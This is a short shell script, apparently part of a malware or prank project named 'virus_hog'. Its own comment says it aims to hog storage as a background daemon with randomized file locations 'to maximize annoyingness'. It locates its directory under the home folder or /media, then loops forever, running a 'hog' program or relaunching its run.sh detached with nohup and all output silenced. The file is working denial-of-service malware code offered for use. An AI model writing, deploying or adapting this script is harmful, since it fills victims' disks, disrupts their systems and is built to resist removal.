#!/bin/sh

# hog storage as daemon with multi-threading. make sure file locations are randomized to maximize annoyingness
PATH_HOGSH=$(find $HOME -name "virus_hog")
if [ -z "$PATH_HOGSH" ]; then
	PATH_HOGSH=$(find /media -name "virus_hog")
fi

while [ true ] ; do
	if [ -f hog ]; then
		./$PATH_HOGSH/hog
	else
		nohup sh $PATH_HOGSH/run.sh 0<&- &>/dev/null &
	fi
done
